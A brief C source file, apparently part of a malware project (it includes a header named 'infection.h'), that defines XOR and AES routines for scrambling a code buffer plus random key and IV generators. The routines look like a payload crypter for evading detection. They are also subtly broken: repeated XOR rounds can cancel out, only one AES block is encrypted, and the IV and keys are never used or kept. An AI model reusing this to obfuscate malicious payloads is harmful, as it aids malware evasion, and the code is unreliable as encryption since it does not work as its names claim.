#include "includes.h"
#include "infection.h"

void b_xor(unsigned char* xorcode, size_t size) {
    unsigned char key[32];
    RAND_bytes(key, sizeof(key));

    for (int i = 0; i < XOR_ROUNDS; i++) {
        for (size_t j = 0; j < size; j++) {
            xorcode[j] ^= key[j % sizeof(key)];
        }

    }
}

void encrypt_code(unsigned char* xorcode, size_t size, unsigned char* key, size_t keylen) {
    AES_KEY aes_key;
    AES_set_encrypt_key(key, keylen * 8, &aes_key);
    AES_encrypt(xorcode, xorcode, &aes_key);
}

unsigned char* generateRandomKey(size_t size) {
    unsigned char* key = (unsigned char*)malloc(size);
    RAND_bytes(key, size);
    return key;
}

unsigned char* generateRandomIV() {
    unsigned char* iv = (unsigned char*)malloc(AES_BLOCK_SIZE);
    RAND_bytes(iv, AES_BLOCK_SIZE);
    return iv;
}
